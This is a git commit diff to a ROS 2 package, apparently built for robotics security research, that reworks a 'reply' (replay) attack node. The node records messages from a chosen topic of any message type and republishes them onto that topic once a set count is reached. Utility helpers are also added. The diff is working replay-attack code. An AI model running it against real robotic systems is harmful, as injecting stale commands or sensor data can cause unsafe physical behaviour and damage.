742fc7252fdef1a373bce44d12dc94ce50c95479
Raúl Álvarez de Celis <r-a-c@users.noreply.github.com>
2024-10-16 03:17:33 +0200

    Fixes to reply attack and enhances

--- roboticpark_cyberattacks/replyattack.py
+++ roboticpark_cyberattacks/replyattack.py
@@ -3,50 +3,67 @@ from rclpy.node import Node, NodeNameNonExistentError
 from rclpy import Parameter
 from std_srvs.srv import Empty
 from rcl_interfaces.srv import GetParameters
-from roboticpark_cyberattacks.utils import rslg
+from roboticpark_cyberattacks.utils import rslg, printargs, import_message_type
 from rcl_interfaces.srv import *
 from std_msgs.msg import String
 import random, socket
 from ping3 import ping
 import concurrent.futures
-import importlib
+
 
 class replynode(Node):
 
     replyTopic = None
+    replyTopicType = None
     messaggesList = []
     replyAmount = 0
+    replied = False
 
     def __init__(self):
         super().__init__("replynode")
         self.declare_parameter('reply_topic', "Unset")
+        self.declare_parameter('reply_topic_type', "Unset")
         self.declare_parameter('reply_amount', "Unset")
-        replyTopic = self.get_parameter('reply_topic').get_parameter_value().string_value
-        replyAmount = int(self.get_parameter('reply_amount').get_parameter_value().string_value)
-        
-        if self.replyAmount == 'Unset' or self.replyTopic == 'Unset':
+        self.replyTopic = self.get_parameter('reply_topic').get_parameter_value().string_value
+        replyTopicTypeValue = self.get_parameter('reply_topic_type').get_parameter_value().string_value
+        self.replyAmount = int(self.get_parameter('reply_amount').get_parameter_value().string_value)
+        printargs(self)
+
+        if self.replyAmount == 'Unset' or self.replyTopic == 'Unset' or replyTopicTypeValue == 'Unset':
             rslg(self,f'No reply_topic or reply_amount passed as parameter')
 
-        self.subscription = self.create_subscription(String,replyTopic,self.save_messagges,10)
+
+        self.replyTopicType = import_message_type(self,replyTopicTypeValue)
+        self.subscription = self.create_subscription(self.replyTopicType,self.replyTopic,self.save_messagges,10)
+
+        # We reply when needed
+        # anything = input('Print anything to start replying the data')
+        # self.publishStoredData()
 
     def save_messagges(self, msg):
-        self.get_logger().info(f'Mensaje recibido: {msg.data}')
         if not len(self.messaggesList) > self.replyAmount:
+            rslg(self,f'Mensaje recibido: {msg}')
             self.messaggesList.append(msg)
+        else:
+            if not self.replied:
+                self.replied = True
+                rslg(self,f'Replying Data')
+                self.publishStoredData()
 
     def publishStoredData(self):
-        self.publisher_ = self.create_publisher(String, self.replyTopic, 10)
+        self.publisher_ = self.create_publisher(self.replyTopicType, self.replyTopic, 10)
         for i in self.messaggesList:
+            rslg(self,f'Publishsing {i}')
             self.publisher_.publish(i)
-            self.get_logger().info('Publishing: "%s"' % i.data)
+
 
 
 def main():
     rclpy.init()
     myreplynode = replynode()
 
+    rclpy.spin(myreplynode)
 
-    # We reply when needed
-    anything = input('Print anything to start replying the data')
-    myreplynode.publishStoredData()
 
+
+    rclpy.shutdown()
--- roboticpark_cyberattacks/utils.py
+++ roboticpark_cyberattacks/utils.py
@@ -1,2 +1,45 @@
+import importlib
+
+def printargs(node):
+    """Prints every param present in the node and its values
+
+       Parameters
+       ----------
+       node: Node The node 
+    """
+    
+    for i in node.get_parameters_by_prefix(''):
+        pamname=i
+        pamvalue=node.get_parameter(i)._value
+        rslg(node,f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')
+
 def rslg(node,msg):
+    """Prints info into node's log
+
+       Parameters
+       ----------
+       node: Node The node 
+       msg: String, the message
+    """
     node.get_logger().info(msg)
+
+def import_message_type(node,msg_type_str):
+    """This function searchs for the class object needed accoding to the params. 
+
+       Parameters:
+
+       node: Node, the node used to perform the activities.
+       msg_type_str: String, the type of the messagge, as a string. 
+
+       Returns:
+
+       None if no class if found else the objective class.
+    """
+    try:
+        package_name, msg_name = msg_type_str.split("/",1)
+        msg, msg_name = msg_name.split("/",1)
+        module = importlib.import_module(f"{package_name}.msg")
+        return getattr(module, msg_name)
+    except Exception as e:
+        rslg(node,f"Problem with the type '{msg_type_str}': {e}")
+        return None
